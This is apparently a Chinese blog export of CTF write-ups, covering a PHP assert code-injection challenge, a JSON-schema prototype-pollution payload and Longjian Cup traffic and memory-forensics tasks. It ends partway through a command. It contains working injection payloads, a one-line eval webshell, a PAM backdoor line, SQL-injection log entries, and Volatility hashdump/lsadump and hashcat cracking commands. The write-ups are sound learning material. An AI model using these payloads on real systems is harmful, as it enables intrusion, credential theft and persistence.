    <content type="html"><![CDATA[<h2 id="ezphp">ezphp</h2><ul><li><p>收获：rce，代码执行</p><ul><li><p>⭕通过代码执行或命令执行写Shell：https://www.bilibili.com/read/cv11569998</p></li><li><p>https://blog.csdn.net/qq_46150940/article/details/110044575</p></li></ul></li><li><p>差不多原题：https://blog.csdn.net/About23/article/details/95075416、https://www.jianshu.com/p/47bbfaf3f2d9</p></li></ul><h3 id="知识点">知识点</h3><ul><li><p>php运算符及优先级：https://www.php.net/manual/zh/language.operators.logical.php</p></li><li><p>bool orbool这样的语句中，如果前一个值为真后一个值就不会再判断了</p></li><li><p>assert assert ( mixed $assertion [, Throwable $exception ] ) :bool——— assert — 检查一个断言是否为FALSE，如果是false，返回1，否则返回0</p><ul><li>如果参数是字符串，它将会被 assert() 当做 PHP 代码来执行</li></ul></li><li><p>strpos 如果没找到 needle，将返回 false。</p></li></ul><h3 id="解题">解题</h3><ul><li>assert($safe_check1) or die("no no no!");<ul><li>只有assert为真才不会die，assert参数为false才返回1。符合假定则就不会die</li></ul></li><li>所以只要闭合assert右括号，并注释掉die即可<ul><li>assert(" strpos('pages/flag','..')||phpinfo();//.php ', '..') ===false ")</li></ul></li><li>输入')||phpinfo();//，代码执行，显示phpinfo=》命令执行</li></ul><h4 id="解法1在源码里php会被执行">解法1：在源码里！！php会被执行！</h4><ul><li><p>index.php跟pages文件夹在同一目录下，注意加上./!，下面的都可以！</p><ul><li><p>')||system('cat ./pages/flag.php');//</p></li><li><p>1','1')||system('cat ./pages/flag.php');//</p></li><li><p>flag','.')||system('cat pages/flag.php');//</p></li><li><p>')||eval("system('cat ./pages/flag.php');");//</p></li><li><p>')||print_r(file_get_contents('./pages/flag.php'));//</p></li></ul></li><li><p>url：view-source:http://e6e8c804-8ce5-4caa-9940-411be14f96fb.zzctf.dasctf.com/?link_page=1%27,%271%27)||system(%27cat%20./pages/flag.php%27);//<img src="https://api2.mubu.com/v3/document_image/756e8572-0051-4ab5-86f6-a50f4ad45031-11812322.jpg"><img src="https://api2.mubu.com/v3/document_image/47729fa1-eb75-44e3-a60b-788116c9f2b4-11812322.jpg"></p></li><li><p>flag找到//DASCTF{c804c562fffd14c6ae757e07b30126ee}</p></li></ul><h4 id="解法2">解法2</h4><p>也可用蚁剑?link_page=flag.php', '..') ===true|eval($_POST['yy']);//，post传参yy=system('ls /');，密码yy</p><ul><li><p>在Linux上， ; 可以用 |、|| 代替</p><ul><li><p>;前面的执行完执行后面的</p></li><li><p>|是管道符，显示后面的执行结果</p></li><li><p>||当前面的执行出错时执行后面的</p></li></ul></li><li><p>在Windows上，不能用 ; 可以用&amp;、&amp;&amp;、|、||代替</p><ul><li><p>&amp;前面的语句为假则直接执行后面的</p></li><li><p>&amp;&amp;前面的语句为假则直接出错，后面的也不执行</p></li><li><p>|直接执行后面的语句</p></li><li><p>||前面出错执行后面的</p></li></ul></li></ul><h2 id="easyjava">easyjava</h2><ul><li><p>wp：https://ha1c9on.top/2021/09/29/2021-lvcvheng-ezjava/</p></li><li><p>wp2：https://www.wolai.com/atao/i6PwXQdpbcwBeXvJVLrjMr</p></li></ul><h2 id="easycms">easycms</h2><ul><li><p>http://240ecfdd-1600-46bb-99cc-c5c21cc46f55.zzctf.dasctf.com/</p></li><li><p>wp</p><ul><li>https://guokeya.github.io/post/8ZEuy4BXz/</li></ul></li></ul><h2 id="looking-for-treasure">Looking for treasure</h2><ul><li><p>考点：源码审计、json-schema原型链污染</p></li><li><p>wp：https://blog.csdn.net/weixin_52091458/article/details/120560406</p></li><li><p>js知识点</p><ul><li><p>let命令，用来声明局部变量，类似于var，但var是全局变量，let是花括号内局部变量</p></li><li><p>console.log()，输出括号里的东西</p></li><li><p>req.body是用在post请求当中得到请求体</p></li><li><p>lodash是java的原生库，里面有很多方法（函数）可以用</p></li><li><p>object.toString()，以字符串的形式返回对象内容</p></li><li><p>JSON.parse() 方法将数据转换为 JavaScript 对象。</p></li><li><p><a href="https://juejin.cn/post/6844903920976789511">Express中res.json及res.send()</a>，都是发送内容到http响应body里，但可能因类型不同导致Content-Type不同</p></li><li><p>获取url参数：/path/:id,参数在req.params.id中，/path?id=xx,参数在req.query.id中，：表示后面的是参数</p></li><li><p>逻辑非运算符!&gt;逻辑或运算符||，先非后或，或只要前面是true则不会执行后面</p></li><li><p>JSON Schema本身是是JSON数据的规范/模板，是一种数据结构</p></li><li><p>⭕原型链污染</p><ul><li><p>https://www.cnblogs.com/l0nmar/p/13951739.html</p></li><li><p>Defcon CTF Final Web wp（部分原题）：<a href="https://0day.design/2020/08/11/defcon%20CTF%20Final%20Web%20WriteUp/">https://0day.design/2020/08/11/defcon%20CTF%20Final%20Web%20WriteUp/</a></p></li><li><p>知识库，少：https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html</p></li><li><p>freebuf https://www.freebuf.com/articles/web/264966.html</p></li></ul></li></ul></li></ul><h3 id="解题-1">解题</h3><ul><li><p>fs.readFileSync()方法是fs模块的内置应用程序编程接口，用于读取文件并返回其内容。</p><ul><li><p>这里读取了p文件，如果能控制p的值就能实现文件读取。</p><ul><li>lodash.isEqual(req.body,content)，检查post的body是否与读取的文件内容相同，这个肯定是不相同的不用管它，所以p的内容最后会在报错信息的content里发出，以这种形式res.send({"validator": valid, "content" : content, "log": "wrong content"})</li></ul></li><li><p>p怎么来的，config.path给p赋值。所以得想办法控制path的值。<img src="https://api2.mubu.com/v3/document_image/c13adcb2-dab3-4d12-8452-fb2f1c7025e5-11812322.jpg"></p></li><li><p>一开始url无参数，!req.params.library为true，直接req.params.library= "json-schema";</p></li><li><p>看到这个想到json-schema原型链污染</p></li></ul></li><li><p>payload</p><ul><li>{"$schema":{"type":"object","properties":{"<strong>proto</strong>":{"type":"object","properties":{"path":{"type":"string","default":"/etc/passwd"}}}}}}<ul><li>default后面的字符串可控<img src="https://api2.mubu.com/v3/document_image/5c821c1d-dd7e-470f-b7d3-514c870dea79-11812322.jpg"></li></ul></li><li>DASCTF{5117143e660f592adc982dd96d2c3f17}</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF,比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>陇剑杯部分WP</title>
    <link href="/2021/09/16/%E9%99%87%E5%89%91%E6%9D%AF%E9%83%A8%E5%88%86WP/"/>
    <url>/2021/09/16/%E9%99%87%E5%89%91%E6%9D%AF%E9%83%A8%E5%88%86WP/</url>
    
    <content type="html"><![CDATA[<p>流量杯了属实是，web手初试流量分析orz，学到很多。。。</p><h2 id="流量分析">🔗流量分析</h2><blockquote><p><a href="https://jwt1399.top/posts/29176.html#toc-heading-17">CTF流量分析题目总结</a></p><p><a href="https://blkstone.github.io/2017/11/09/wireshark-basic/">CTF视角的wireshark基础</a></p></blockquote><h2 id="内存取证">🔗内存取证</h2><blockquote><p>​ <a href="https://r0fus0d.blog.ffffffff0x.com/post/memory_forensics/">总结</a></p></blockquote><h2 id="wp参考">WP参考</h2><blockquote><p><a href="http://www.snowywar.top/?p=2554">魔法少女</a></p><p><a href="https://www.xl-bit.cn/index.php/archives/724/">bit师傅</a></p></blockquote><h2 id="工具">🔧工具</h2><blockquote><p><a href="https://chef.miaotony.xyz/">bake工具</a></p><p><a href="https://www.sqlsec.com/2019/10/hashcat.html">密码爆破神器--Hashcat【kali自带】</a></p><p><a href="https://crackstation.net/">国外在线hash解密</a></p><p><a href="https://jwt.io/">JWT在线加解密</a></p><p><a href="https://github.com/RealityNet/kobackupdec">华为手机备份文件解密</a></p></blockquote><h2 id="jwt">JWT</h2><p><span style="background:#FFDBBB;">收获：jwt认证、wireshark流量分析看包</span></p><h3 id="准备知识">📚准备知识</h3><ul><li><p>jwt类似cookie，也是一种认证方式，是token的一种</p></li><li><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkphdmHnoo7noo7lv7UiLCJpYXQiOjE1MTYyMzkwMjJ9.LLJIkhJs6SVYlzn3n8fThQmhGutjTDI3RURTLtHV4ls</p></li><li><p>JWT包含三个部分：Header头部，Payload负载和Signature签名。由三部分生成token，三部分之间用“.”号做分割。</p></li><li><p>参考</p><ul><li><p>JWT与cookie和token的区别：https://blog.csdn.net/Cjava_math/article/details/81563871</p></li><li><p>一分钟带你了解JWT认证！https://www.cnblogs.com/haha12/p/11796456.html</p></li><li><p>https://www.cnblogs.com/aaron911/p/11300062.html</p></li><li><p>JWT在线解密：https://jwt.io/</p></li></ul></li></ul><h3 id="解题">✍解题</h3><ul><li><p>2.1该网站使用了<code>___jwt___</code>认证方式。（如有字母请全部使用小写）</p><ul><li>下载附件，打开流量包，直接过滤http包，追踪流，看到token=eyJh...，直接锁定为jwt认证方式（题目专题也是jwt）</li></ul></li><li><p>2.2黑客绕过验证使用的jwt中，id和username是<code>_10087#admin_</code>。（中间使用#号隔开，例如1#admin）</p><ul><li><p>看到POST，追踪http，发现token，解密得到10086#admin，不对，看响应包，说权限不够，登陆失败，继续找</p><p><img src="https://api2.mubu.com/v3/document_image/0df57412-e759-4e46-8ec1-a7ef38ea55f7-11812322.jpg" alt="img"></p></li><li><p>找post的，追踪，搜索token，找到不一样的，发现登陆成功=》10087#admin，【<strong>注意先找大包，时间先后，post</strong>】</p><p><img src="https://api2.mubu.com/v3/document_image/c49414ab-877b-41a5-a92d-b8f2ccbf18f1-11812322.jpg" alt="img"></p></li></ul></li><li><p>2.3黑客获取webshell之后，权限是<code>___root___</code>？</p></li><li><p>2.4黑客上传的恶意文件文件名是<code>__1.c__</code>。(请提交带有文件后缀的文件名，例如x.txt)</p><ul><li><p>==注意筛选post，时间先后！==然后发现echo&gt;1.c，说明恶意代码写入了1.c</p><p><img src="https://api2.mubu.com/v3/document_image/f0ad57f5-27b3-40fc-bb69-3dd8b38de2bc-11812322.jpg" alt="img"></p></li></ul></li><li><p>2.5黑客在服务器上编译的恶意so文件，文件名是<code>__looter.so__</code>。(请提交带有文件后缀的文件名，例如x.so)</p><ul><li><p>继续看时间，post，发现移动1.c并改名了，然后117号包就编译了</p><p><img src="https://api2.mubu.com/v3/document_image/aede6f28-c0b0-4f2f-8c81-751e401d3506-11812322.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/62f20a0c-2b92-4fae-9d91-050480cc4e4f-11812322.jpg" alt="img"></p></li><li><p>发现要编译的文件：looter.so</p><p><img src="https://api2.mubu.com/v3/document_image/1a05340b-1111-4ed9-963a-b1da33c38bc0-11812322.jpg" alt="img" style="zoom: 50%;"></p></li></ul></li><li><p>2.6黑客在服务器上修改了一个配置文件，文件的绝对路径为<code>__/etc/pam.d/common-auth__</code>。（请确认绝对路径后再提交）</p><ul><li>找、看post包体，command是url编码后的，找到<code>Form item: "command" = "echo "auth optional looter.so"&gt;&gt;/etc/pam.d/common-auth"</code>，恶意文件绝对路径：<code>/etc/pam.d/common-auth</code></li></ul></li></ul><h2 id="webshell">webshell</h2><p><span style="background:#FFDBBB;">收获：wireshark检索、权限怎么看、从代理工具frpc看socket5账号密码</span></p><h3 id="准备知识-1">准备知识</h3><ul><li><p>ob函数</p><ul><li><p><a href="https://www.cnblogs.com/xuzhengzong/p/7240809.html">PHP详解ob_clean,ob_start和ob_get_contents函数</a></p></li><li><p>start：开始记录要输出的东西，==并且所有输出放缓存区而不是浏览器！==</p></li><li><p>get_contents();取出从ob_start()函数开始的地方到这个函数之间所有输出的内容并连在一起</p></li><li><p>⚠注意：start后，在任何时候使用echo，输出都将被加入缓冲区中，直到程序运行结束或者使用ob_flush()来结束。然后在服务器中缓冲区的内容才会发送到浏览器，由浏览器来解析显示。</p></li></ul></li><li><p>try catch ：php异常处理</p><ul><li><p>Exception：异常</p></li><li><p>将要执行的代码放入TRY块中,如果这些代码执行过程中某一条语句发生异常,则程序直接跳转到CATCH块中,由$e收集错误信息和显示</p></li><li><p>参考：<a href="https://www.runoob.com/php/php-exception.html"><strong>PHP异常处理</strong></a></p></li></ul></li><li><p>php_uname — 返回运行 PHP 的系统的有关信息</p><ul><li>参数没有或为a时默认返回全部信息即操作系统名称、主机名、版本名称、版本信息、机器类型，eg：<code>Linux localhost 2.4.21-0.13mdk #1 Fri Mar 14 15:08:06 EST 2003 i686</code>,而<code>echo PHP_OS</code>只返回Linux</li></ul></li><li><p>substr</p><ul><li>字符串中的第一个字符的索引为0，第三个参数表示截取长度没有则一直到结尾</li></ul></li><li><p>urldecode(),解码字符串中的%16进制【url编码就是%+16进制数】</p></li></ul><h3 id="解题-1">解题✍</h3><ul><li><p>3.1黑客登录系统使用的密码是？</p><ul><li>搜索password，在分组详情里，找到password为Admin123!@#</li></ul></li><li><p>3.2黑客修改了一个日志文件，文件的绝对路径为？。（请确认绝对路径后再提交）</p><ul><li>继续找POST，发现日志文件路径data/Runtime/Logs/Home/21_08_07.log</li></ul></li><li><p>3.3黑客获取webshell之后，权限是______？</p><ul><li><p>继续找POST，发现317包有系统命令whoami，<strong>回答经对比发现是在&lt;!DOCUMENT&gt;前default/后,权限是www-data</strong>，【<span style="background:#FF9999;">⚠权限无非一般就是www-data,或者root</span>】</p><p><img src="https://api2.mubu.com/v3/document_image/fd8c652a-92b4-42d3-a258-1c829ab1f177-11812322.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/47c95dc1-d440-4d68-9d7b-6b69f7a37fdd-11812322.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/0959a132-4a15-4839-a182-28653be2a2de-11812322.jpg" alt="img"></p></li></ul></li><li><p>3.4黑客写入的webshell文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)</p><ul><li><p>发现base64的一句话木马，<code>&lt;?php eval($_REQUEST[aaa]);?&gt;</code>，<code>"aaa" = "system('echo PDxxxxxxxxxxxxx|base64 -d &gt; /var/www/html/1.php')"</code>则文件名是1.php</p><p><img src="https://api2.mubu.com/v3/document_image/9d7dc7f0-0f95-46e8-bbfc-ad7309c1ff43-11812322.jpg" alt="img"></p></li></ul></li><li><p>3.5黑客上传的代理工具客户端名字是______frpc_______。（如有字母请全部使用小写）</p><ul><li><p>后分析POST包，代码审计，<strong>substr去掉前两位</strong>base64解密=》L3Zhci93d3cvaHRtbC9mcnBjLmluaQ===》 /var/www/html/frpc.ini=》==frpc：为反向代理内网穿透常用工具==，注意：之前的value<code>&amp;j68071301598f=HdL3Zhci93d3cvaHRtbC8=;=&gt;L3Zhci93d3cvaHRtbC8=   =&gt;/var/www/html/</code>无效！</p><ul><li><p>响应包的文件信息，也可以看到代理文件=》frpc</p><p><img src="https://api2.mubu.com/v3/document_image/3f490319-4495-4d33-ac75-e3c9cdc8e564-11812322.jpg" alt="img" style="zoom:67%;"></p></li></ul></li></ul></li><li><p>3.6黑客代理工具的回连服务端IP是_____192.168.239.123________。</p></li><li><p>3.7黑客的socks5的连接账号、密码是<code>__0HDFt16cLQJ#JTN276Gp___</code>。（中间使用#号隔开，例如admin#passwd）</p><ul><li><p>代理客户端ip：对上面发现设置代理ini的包下面还有一串参数，16进制转换=》代理地址为192.168.239.123，socket5账号密码：0HDFt16cLQJ#JTN276Gp</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/3e3f505d-9052-43a9-8c4f-8c126076dd70-11812322.jpg" alt="img" style="zoom:50%;"></p></li></ul></li></ul><h2 id="日志分析">日志分析</h2><p>要点：<span style="background:#FFDBBB;">直接记事本打开，Ctrl+F，搜200</span></p><h2 id="内存分析"><strong>内存分析</strong> ❗</h2><p><span style="background:#FFDBBB;">收获：</span></p><ul><li>volatility内存取证mimikatz爆破密码</li><li>volatility文件扫描检索、dump文件、dumphash表、查看内存信息、注册表、直接提取LSA密码</li><li>华为备份文件还原</li></ul><h3 id="准备知识-2">📚准备知识</h3><h4 id="volatility">volatility</h4><ul><li><p><a href="https://blog.csdn.net/chanyi0040/article/details/100956582">Volatility工具指令篇：</a></p><ul><li><p>volatility -f Target.vmem imageinfo --查看内存信息</p></li><li><p>volatility -f Target.vmem --profile=Win7SP1x64 hivelist--查看注册表信息，如所有用户名、密码hash、病毒隐藏、恶意启动项、映射劫持。等</p></li><li><p>volatility -f Target.vmem --profile=Win7SP1x64 hashdump--获取用户名及密码hash，一行一个用户 【获取特定用户hashdump -ysystem的偏移量 -s SAM的偏移量】</p></li><li><p>volatility -f Target.vmem --profile=Win7SP1x64 lsadump--获取最后登录的用户名</p></li></ul></li><li><p>密码爆破神器--Hashcat：https://www.sqlsec.com/2019/10/hashcat.html【kali自带】</p></li><li><p>-m 接hash类型，默认0：md5。-a指定爆破模式，0：字典爆破</p></li><li><p><code>hashcat64.exe -m 0 -a 0 5ec822debe54b1935f78d9a6ab900a39 password.txt</code>使用密码字典破解 MD5 哈希</p></li><li><p>国外在线hash解密</p><ul><li>https://crackstation.net/</li></ul></li><li><p>华为备份文件解密</p><ul><li><p>https://github.com/RealityNet/kobackupdec</p></li><li><p>py -3 kobackupdec.py -vvv 设置的密码 “备份文件存放目录(文件夹)”解密文件的存放目录</p></li></ul></li></ul><h3 id="解题-2">✍解题</h3><p>题目：题目描述:网管小王制作了一个虚拟机文件，让您来分析后作答：</p><h4 id="vol爆破虚拟机密码">vol爆破虚拟机密码</h4><p>虚拟机的密码是<code>___flag&#123;W31C0M3 T0 THiS 34SY F0R3NSiCX&#125;_</code>。（密码中为flag{xxxx}，含有空格，提交时不要去掉）</p><ul><li><p>txt提示no space but underline，没有空格但有下划线</p></li><li><p>先kali对镜像文件获取信息：<code>vol.py -f 'Target.vmem' imageinfo</code>，取第一个关键文件Win7SP1x64</p><p><img src="https://api2.mubu.com/v3/document_image/2d2d6a13-e146-44f0-bb27-49fd9b5f7e00-11812322.jpg" alt="img"></p></li><li><p>再用户名密码导出hash<code>vol.py -f 'Target.vmem' --profile=Win7SP1x64 hashdump</code></p><ul><li><p>尝试对hash解密，发现没有结果</p><p><img src="https://api2.mubu.com/v3/document_image/4709cc48-538c-4e4a-b459-7d70b39c8496-11812322.jpg" alt="img"></p></li></ul></li><li><p>从注册表转储（解密）LSA机密<code>vol.py -f 'Target.vmem' --profile=Win7SP1x64 lsadump</code>发现flag</p><p><img src="https://api2.mubu.com/v3/document_image/2e80b0ff-c2b1-41c2-927a-81f8a3d6de56-11812322.jpg" alt="img" style="zoom:67%;"></p></li><li><p>还可以直接使用minikatz插件获取flag【安装时注意mimikatz里的模块construct版本问题，2.5.5-reupload在<a href="https://mirrors.huaweicloud.com/repository/pypi/simple/construct/">这里下</a>】</p><p><img src="https://api2.mubu.com/v3/document_image/13ec32cf-3597-4af9-817f-85f5e7230826-11812322.jpg" alt="img"></p></li></ul><h4 id="vol导文件华为手机备份文件取证">vol导文件+华为手机备份文件取证</h4><p>虚拟机中有一个某品牌手机的备份文件，文件里的图片里的字符串为<code>__flag&#123;TH4NK Y0U FOR DECRYPTING MY DATA&#125;__</code>。（解题过程中需要用到上一题答案中flag{}内的内容进行处理。本题的格式也是flag{xxx}，含有空格，提交时不要去掉)</p><ul><li><p>第二题先搜下文件，发现好多华为P40相关的文件，都取出来然后用一个华为备份还原的脚本一把梭了</p></li><li><p>文件扫描<code>vol.py -f Target.vmem --profile=Win7SP1x64 filescan</code>看到华为的信息，再筛选<code>vol.py -f Target.vmem --profile=Win7SP1x64 filescan | grep 'HUAWEI'</code></p><p><img src="https://api2.mubu.com/v3/document_image/8d1e4b50-4ca1-4361-ad4c-af3ca70f7a73-11812322.jpg" alt="img"></p></li><li><p>==由于华为手机助手加密的文件解密时需要依赖整个文件夹中的文件，只有一个images0.tar.enc是不行的。==</p><ul><li><p>在当前目录下导出tar和第一个文件<code>vol.py -f Target.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007fe72430 -D ./</code>导出文件为.dat文件，<code>vol.py -f Target.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007d8c7d10 -D ./</code></p><p><img src="https://api2.mubu.com/v3/document_image/e6055238-6bb6-4c98-b12e-fada725a6276-11812322.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/f386b2f2-bb53-4b11-978e-519a9d1287fc-11812322.jpg" alt="img"></p></li><li><p>打开dat文件，发现文件夹里面就是我们需要的内容</p></li></ul></li></ul><p><strong>华为备份解密器</strong></p><ul><li><p>方便起见把HUAWEI P40_2021-aa-bbxx.yy.zz更名为in，决定生成在out文件夹里（未创建）</p></li><li><p><code>python3 kobackupdec.py -vvv W31C0M3_T0_THiS_34SY_F0R3NSiCX ./in ./out</code>【kali运行失败，win成功】</p><p><img src="https://api2.mubu.com/v3/document_image/b758ae8d-5786-4702-931b-dc1adae58061-11812322.jpg" alt="img"></p></li><li><p>打开out文件夹，找到图片，发现flag{TH4NK Y0U FOR DECRYPTING MYDATA}</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/95adb600-2ddb-421b-b414-c180d1fc4470-11812322.jpg" alt="img" style="zoom:67%;"></p></li></ul><h2 id="sql注入">SQL注入</h2><p>记得好像是看日志</p><p><span style="background:#FFDBBB;">要点：注意问库名表名列名时可看字段名前的一条信息，直接一条全弄出来sqli#flag#flag，字段值才需要一个一个字母看</span> <span style="background:#FFDBBB;"> </span></p><pre><code class="hljs accesslog"><span class="hljs-number">172.17.0.1</span> - - <span class="hljs-string">[01/Sep/2021:01:45:55 +0000]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /index.php?id=1%20and%20if(substr((select%20flag%20from%20sqli.flag),2,1)%20=%20&#x27;r&#x27;,1,(select%20table_name%20from%20information_schema.tables)) HTTP/1.1&quot;</span> <span class="hljs-number">200</span> <span class="hljs-number">424</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;python-requests/2.26.0&quot;</span></code></pre><h2 id="wifi"><strong>wifi</strong> ❗</h2><p><strong><span style="background:#FFDBBB;">收获：</span></strong></p><ul><li>网卡的GUID与interface</li><li>vol imageinfo+cmdscan+filescan+dumpfile</li><li>wifi密码airdecap-ng破解</li><li>wireshark客户端服务端哥斯拉流量分析+解密应答包</li></ul><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20211209190857123.png" alt="image-20211209190857123"></p><h3 id="准备知识-3">📚准备知识</h3><h4 id="guid">GUID</h4><ul><li><p>什么是 GUID？又叫uuid（通用标识符）</p><ul><li><p>全球唯一标识符 (GUID)是一个字母数字标识符，用于指示产品的唯一性安装。在许多流行软件应用程序（例如Web 浏览器和媒体播放器）中，都使用 GUID。</p></li><li><p>==GUID 的格式为“xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx”==，其中每个x 是 0-9 或 a-f范围内的一个十六进制的数字。例如：6F9619FF-8B86-D011-B42D-00C04FC964FF即为有效的 GUID 值</p></li><li><p>{CAF53C68-A94C-11D2-BB4A-00C04FA330A6}</p></li></ul></li><li><p>为什么要用GUID？</p><ul><li>世界上的任何两台计算机都不会生成重复的 GUID 值。GUID主要用于在拥有多个节点、多台计算机的网络或系统中，分配必须具有唯一性的标识符。在Windows 平台上，GUID应用非常广泛：注册表、类及接口标识、数据库、甚至自动生成的机器名、目录名等。</li></ul></li></ul><h4 id="kalivol内存取证">kali，vol内存取证</h4><ul><li><p>参考：</p><ul><li><p><a href="http://www.atkx.top/2021/06/03/Volatility内存取证/">http://www.atkx.top/2021/06/03/Volatility%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</a></p></li><li><p>https://cjjkkk.github.io/Volatility-WindowsMemoryForensicsAnalysis/</p></li></ul></li><li><p><code>python vol.py -f [image] ‐-profile=[profile][plugin]</code>其中-f 后面加的是要取证的文件， --profile 后加的是工具识别出的系统版本，[plugin]是指使用的插件，其中默认存在一些插件，另外还可以自己下载一些插件扩充。<span style="background:#bbffff;">常见的内存镜像文件有raw、vmem、dmp、img等</span></p></li><li><p><code>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] filescan | grep flag</code>扫描所有的文件搜索flag</p></li><li><p>imageinfo后一般情况下第一个就是对的:如：Win7SP1x64</p></li></ul><h4 id="wifi密码">WIFI密码</h4><ul><li><p><span style="background:#bbffff;">关于系统保存的wifi密码文件地址</span>:如果是WindowsVista或Windows7，保存在<code>c:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\[网卡Guid]</code>，每个无线网络对应一个XML文档</p></li><li><p><span style="background:#FF9999;"><strong>有密码的流量包如何解密wifi？</strong></span></p><ul><li><p>wireshark：成功拿到wifi密码和ssid，233@114514_qweMy_Wifi，那就可以尝试解密wifi流量包了。<strong>设置方法：编辑-首选项-Protocols-IEEE802.11-Edit</strong>,设置好后点击ok，就可以看到解密的流量包了</p></li><li><p>或者airdecap-ng工具</p></li></ul></li></ul><h5 id="airdecap-ng">airdecap-ng</h5><ul><li>用于解开加密的WiFi流量包，需要知道ssid和pass【SSID（路由器发送的无线信号的名字）】</li><li><code>airdecap-ng -e &lt;Kevin’sWi-FI essid&gt; -p &lt;passwd.txt&gt; 目标.cap</code></li><li><a href="https://www.bilibili.com/read/cv9131435">衍生：三分钟，快速入狱教程，之如何迅速破解WiFi密码</a>、 <a href="https://www.cnblogs.com/lsdb/p/10075508.html">2</a></li></ul><h4 id="压缩函数">压缩函数</h4><p><a href="http://m.w3capi.com/m_doc/chapter/id/105/cid/21.html#sub-198">PHP字符串各种压缩函数，， gzencode 和 gzdecode</a></p><ul><li><code>gzencode ( string $data [, int $level = -1 [, int $encoding_mode = FORCE_GZIP ]] ) : string</code>，第二个参数是压缩等级，第三个是编码模式</li></ul><h4 id="哥斯拉木马">哥斯拉木马❗</h4><ul><li><p>🔗参考：</p><blockquote><p><a href="https://www.geekby.site/2021/03/webshell流量分析/">涉及哥斯拉3个包分析</a></p><p><a href="https://www.freebuf.com/sectool/285693.html">【原创】哥斯拉Godzilla加密流量分析- FreeBuf网络安全行业</a></p></blockquote></li><li><p>是与蚁剑、菜刀、冰蝎类似的webshell管理工具，但它流量加密更强大，<strong>可能菜刀、蚁剑、冰蝎的马刚连上就断，最后只有哥斯拉可以正常连接</strong></p><ul><li><p>密码是后门的参数，pass=xxxxx，这种。密钥：key，用于对请求数据进行加密，不过加密过程中并非直接使用密钥明文，而是计算密钥的md5值，然后<strong>取其前16位</strong>用于加密过程，🐖<span style="background:#FF9999;">！密钥与密码不同！</span></p></li><li><p>哥斯拉测试连接，客户端会传三个POST包，wireshark服务器收到三个包的流量</p><ul><li><p>第1个请求会发送<strong>大量数据</strong>，该请求不含有任何Cookie信息，服务器<strong>响应报文不含任何数据</strong>，但是会设置PHPSESSID，后续客户端请求都会自动带上该Cookie</p><ul><li><p>哥斯拉发送的第一个POST请求中，请求数据的<strong>加密过程为</strong>：将原始数据与shell密钥（本例中为test1234）md5值的前16位（本例中为16d7a4fca7442dda）按位异或，再依次经过base64编码和URL编码，得到编码数据，最终以pass=编码数据的形式作为POST报文请求体，POST到服务器。</p></li><li><p>解密过程与加密过程正好相反：从pass=编码数据中提取编码数据，依次经过URL解码和base64解码，再与shell密钥（本例中为test1234）md5值的前16位（本例中为16d7a4fca7442dda）按位异或即可得到原始请求数据。</p></li></ul></li><li><p>第2个请求与第三个请求一样，已经自动带上了第1个请求中服务器响应返回的Cookie值，body只有少量的数据。</p><ul><li>哥斯发送的第2个POST请求实际上是通过调用函数向服务器POST了原始数据的加密包，如果服务器返回值（解密后）为ok，则说明shell测试连接成功。</li></ul></li></ul></li></ul></li><li><p>==shell代码【加解密、流量分析】==</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20211209192147189.png" alt="image-20211209192147189"></p><ul><li><p>其中比较核心的地方有两处，第一处是进行异或加密和解密的函数encode，第二处是嵌套的两个if对哥斯拉客户端上传的代码做执行并得到结果。根据<code>$data=encode(base64_decode($_POST[$pass]),$key);</code></p></li><li><p>为了使客户端分离出结果，三个echo利用md5值作为分离标志，将得到的代码执行结果进行拼接：</p><ul><li><p>md5(<span class="math inline">\(P.\)</span>T)前16位</p></li><li><p>结果 -&gt; E函数进行异或加密 -&gt; Base64编码</p></li><li><p>md5(<span class="math inline">\(P.\)</span>T)后16位</p></li><li><p>==🐖！：哥斯拉输出结果（密文）是会将结果压缩然后加密 =》gzencode=&gt;gzdecode==</p></li></ul></li><li><p>==！则对客户端收到的包解密：去掉body首位16位=》base64解密=》encode，而新版的哥斯拉对流量包压缩了，因此最后还要加上解压函数=》gzdecode==</p><ul><li><strong>即要想解密服务器响应数据，需要去除混淆字符，进行base64解密，再异或，再进行gzip解密。</strong></li></ul></li></ul></li></ul><h3 id="解题-3">✍解题</h3><p>WP</p><blockquote><ul><li>https://www.nctry.com/2449.html</li><li>微信公众号（黑白天实验室）：http://cn-sec.com/archives/547840.html</li><li>魔法少女：http://www.snowywar.top/?p=2554</li></ul></blockquote><p>题目</p><ul><li><p>网管小王最近喜欢上了ctf网络安全竞赛，他使用“哥斯拉”木马来玩玩upload-labs，并且<strong>保存了内存镜像、wifi流量和服务器流量</strong>，让您来分析后作答：（本题仅1小问）</p></li><li><p>小王往upload-labs上传木马后进行了<code>cat/flag</code>,flag内容为<code>____flag&#123;5db5b7b0bb74babb66e1522f3a6b1b12&#125;___</code>(压缩包里有解压密码的提示，需要额外添加花括号)</p></li></ul><h4 id="取证镜像里面有什么内容目的是破解客户端的流量">1.取证<strong>【镜像里面有什么内容（目的是破解客户端的流量）】</strong></h4><ul><li><p>vol.py -f Windows 7-dde00fa9.vmem imageinfo ，查看镜像文件</p><p><img src="https://api2.mubu.com/v3/document_image/0f6e9772-460c-48ce-8009-38a92e865c81-11812322.jpg" alt="img"></p></li><li><p><code>vol.py -f Windows 7-dde00fa9.vmem  